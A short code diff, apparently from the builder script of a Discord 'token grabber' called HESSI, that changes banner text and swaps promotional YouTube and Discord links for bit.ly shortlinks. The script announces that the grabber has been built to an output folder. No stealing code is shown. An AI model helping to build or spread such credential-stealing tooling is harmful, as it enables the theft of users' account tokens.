@@ -310,7 +310,7 @@ clearConsole()
 
 os.system('cmd /c "color 2"')
 
-exit = "\n                 press enter to exit..."
+exit = "\n[+]press enter to exit..."
 init()
 print(Fore.GREEN + """
                      ██╗░░██╗███████╗░██████╗░██████╗██╗
@@ -320,10 +320,10 @@ print(Fore.GREEN + """
                      ██║░░██║███████╗██████╔╝██████╔╝██║
                      ╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░╚═╝
                                    """)
-webbrowser.open('https://www.youtube.com/channel/UCC00RuLq5Oy59fsMR1zOyRQ')
-print(Fore.BLUE + "                  [-] your token grabber is ready on the output folder!")
+webbrowser.open('https://bit.ly/HESSI-youtube')
+print(Fore.BLUE + "[-] your token grabber is ready on the output folder!")
 input(exit)
 
-webbrowser.open('https://discord.gg/JJ7RyH23eC')
+webbrowser.open('https://bit.ly/HESSI-discord')
 
 os.system('cmd /c "exit"')
